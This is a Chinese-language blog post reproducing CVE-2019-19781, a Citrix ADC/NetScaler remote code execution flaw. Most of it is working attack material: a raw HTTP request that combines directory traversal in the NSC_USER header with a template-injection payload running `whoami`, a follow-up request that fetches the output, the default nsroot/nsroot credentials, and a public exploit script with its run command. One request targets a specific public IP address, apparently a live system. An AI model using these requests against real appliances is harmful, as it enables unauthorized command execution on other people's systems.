# CVE-2019-19781 远程代码执行漏洞复现 - Panisme - 博客园

> 原文：[`www.cnblogs.com/panisme/p/12542721.html`](https://www.cnblogs.com/panisme/p/12542721.html)

漏洞原因：

Citrix ADC（NetScalers）中的目录穿越错误，这个错误会调用 perl 脚本，perl 脚本用于将 XML 格式的文件附加到受害计算机，因此产生远程执行代码。

注：Citrix NetScaler ADC 应用交付控制器和 Citrix NetScaler 网关。

漏洞影响范围：

Citrix NetScaler ADC and NetScaler Gateway version 10.5
Citrix ADC and NetScaler Gateway version 11.1 , 12.0 , 12.1
Citrix ADC and Citrix Gateway version 13.0

漏洞利用过程：

1.pl 文件未对 NSC_USER 参数传入进行过滤
2.触发目录穿越
3.在模板目录的 XML 文件写入命令
4.模板引擎分析后执行命令

漏洞复现：

方法一：

访问 https://target-ip 或 http://target-ip
登录系统，默认用户和密码登录：nsroot/nsroot

利用目录穿越写入命令语句到 newbm.pl 文件中

![](img/77937f7f37339e58004ece3637ec2e03.png)

数据包：

```
POST /vpns/portal/scripts/newbm.pl HTTP/1.1
Host: target-ip
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.23.0
NSC_NONCE: nsroot
NSC_USER: ../../../netscaler/portal/templates/15ffbdca
Content-Length: 89

url=http://example.com&title=15ffbdca&desc=[% template.new('BLOCK' = 'print `whoami`') %]

```

GET 方式访问写入的 xml 文件
![](img/36cdc8d31ac15f1651f2996a5cc33abd.png)

数据包：

```
GET /vpns/portal/15ffbdca.xml HTTP/1.1
Host: 50.202.211.151
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.23.0
NSC_NONCE: nsroot
NSC_USER: nsroot
```

方法二：

EXP 下载地址：https://codeload.github.com/jas502n/CVE-2019-19781/zip/master

```
python CVE-2019-19781-Citrix-ADC-Remote-Code-Execution.py https://target-ip

```

![](img/bd70484745de9d66119d10241cf4cdfe.png)

 提示 http 代理错误，看了下 exp 代码，需要设置本地代理。

![](img/6e0ac71cc0710b8106a4836b096327e9.png)

![](img/dcc48681ad4e0a26546c4471f126b5ec.png)

 文件上传成功，成功执行命令：ls

![](img/2d3982ce4f9151203b95ba872ba5c878.png)